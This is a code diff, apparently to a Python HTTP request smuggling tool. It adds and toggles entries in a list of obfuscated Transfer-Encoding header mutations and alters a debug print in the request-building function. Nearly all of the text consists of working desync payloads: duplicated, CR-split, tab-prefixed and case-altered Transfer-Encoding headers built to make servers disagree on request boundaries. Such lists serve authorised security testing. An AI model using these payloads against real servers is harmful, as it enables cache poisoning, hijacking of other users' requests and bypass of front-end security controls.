@@ -9,7 +9,7 @@ def render_template(gadget):
         p.header += "Content-type: application/x-www-form-urlencoded" + RN
         p.header += "Content-Length: __REPLACE_CL__" + RN
 #       p.header += gadget + RN
-#       print(p.header)
+#        print(bytes(p.header,  "utf-8"))
         return p
 
 def permutation():
@@ -50,10 +50,14 @@ def permutation():
 #                                               mutation["position-%c-list-%02x-i-%02x"%position,element,i]=render_template(template.replace(position,position+element))
 
 #permutation(render_template)
+#mutations["revdualchunkinv2"] = render_template("Transfer-Encoding: chunked\rTransfer-Encoding: aSDaxcaxzd")
+
 mutations["vanilla"] = render_template("Transfer-Encoding: chunked")
 mutations["chunkedchunked"] = render_template("Transfer-Encoding chunked : chunked")
+mutations["chunkedchunked2"] = render_template("Transfer-Encoding: chunkedchunked")
 mutations["spjunk"] = render_template("Transfer-Encoding x: chunked")
 mutations["connection"] = render_template("Connection: Transfer-Encoding\r\nTransfer-Encoding: chunked")
+mutations["revdualchunkinv2"] = render_template("Transfer-Encoding: chunked\rTransfer-Encoding: aSDaxcaxzd")
 mutations["nameprefix1"] = render_template(" Transfer-Encoding: chunked")
 mutations["tabprefix1"] = render_template("Transfer-Encoding:\tchunked")
 mutations["tabprefix2"] = render_template("Transfer-Encoding\t:\tchunked")
@@ -74,7 +78,9 @@ mutations["sarcasm"] = render_template("TrAnSFer-EnCODinG: cHuNkeD")
 mutations["yelling"] = render_template("TRANSFER-ENCODING: CHUNKED")
 mutations["0dsuffix"] = render_template("Transfer-Encoding: chunked\r")
 mutations["tabsuffix"] = render_template("Transfer-Encoding: chunked\t")
+mutations["revdualchunkinv"] = render_template("Transfer-Encoding: chunked\r\nTransfer-Encoding: aSDaxcaxzd")
 mutations["revdualchunk"] = render_template("Transfer-Encoding: cow\r\nTransfer-Encoding: chunked")
+#mutations["revdualchunkinv2"] = render_template("Transfer-Encoding: chunked\rTransfer-Encoding: aSDaxcaxzd")
 mutations["identity"] = render_template("Transfer-Encoding: identity\r\nTransfer-Encoding: chunked")
 mutations["0dspam"] = render_template("Transfer\r-Encoding: chunked")
 mutations["nested"] = render_template("Transfer-Encoding: cow chunked bar")
